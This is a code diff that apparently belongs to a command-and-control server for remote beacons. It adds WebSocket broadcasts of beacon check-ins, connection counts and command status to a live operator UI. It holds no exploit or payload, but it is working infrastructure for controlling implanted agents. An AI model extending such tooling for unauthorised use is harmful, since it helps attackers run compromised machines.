@@ -4,6 +4,13 @@ from http.server import BaseHTTPRequestHandler
 from urllib.parse import parse_qs, urlparse
 
 import colorama
+
+# WebSocket broadcasts for live UI updates
+from Modules.beacon.beacon_server.websocket_server import (
+    publish_beacon_update,
+    publish_command_update,
+    publish_event,
+)
 from Modules.global_objects import beacon_list, command_list, logger, obfuscation_map
 from Modules.utils.ui_manager import (
     log_beacon_checkin,
@@ -46,6 +53,16 @@ def handle_beacon_call_in(handler: BaseHTTPRequestHandler, match: dict):
     beacon.last_beacon = time.asctime()
     beacon.next_beacon = time.asctime(time.localtime(current_time + beacon.timer))
     logger.info(f"Beacon {beacon_id} updated. Next check-in: {beacon.next_beacon}")
+    # Broadcast per-beacon update over WebSocket
+    publish_beacon_update(
+        beacon_id,
+        {
+            "type": "beacon_checkin",
+            "uuid": beacon_id,
+            "hostname": getattr(beacon, "hostname", None),
+            "next_beacon": beacon.next_beacon,
+        },
+    )
 
     # Update database with last_seen timestamp
     if beacon.database:
@@ -63,6 +80,14 @@ def handle_beacon_call_in(handler: BaseHTTPRequestHandler, match: dict):
 
     # Log beacon check-in to live events feed
     update_connection_stats(len(sessions_list), len(beacon_list))
+    # Broadcast global connection stats to the events stream
+    publish_event(
+        {
+            "type": "connection_stats",
+            "sessions": len(sessions_list),
+            "beacons": len(beacon_list),
+        }
+    )
 
     # Check for commands to send
     commands_to_send = []
@@ -129,7 +154,29 @@ def handle_beacon_call_in(handler: BaseHTTPRequestHandler, match: dict):
                     )
 
                     # Log command pickup to live events feed
-                    log_command(command.command, beacon.hostname, "sent")
+                    display_cmd = command.command
+                    try:
+                        if command.command == "load_module":
+                            cmd_data = getattr(command, "command_data", None)
+                            if isinstance(cmd_data, dict):
+                                mod_name = cmd_data.get("name") or cmd_data.get(
+                                    "module_name"
+                                )
+                                if mod_name:
+                                    display_cmd = f"load_module {mod_name}"
+                    except Exception:
+                        pass
+                    log_command(display_cmd, beacon.hostname, "sent")
+                    # Broadcast command lifecycle update over WebSocket
+                    publish_command_update(
+                        {
+                            "type": "command",
+                            "uuid": cmd_id,
+                            "state": "sent",
+                            "command": display_cmd,
+                            "target": beacon.hostname,
+                        }
+                    )
                 except Exception as e:
                     logger.error(f"Failed to update command status to 'Received': {e}")
 
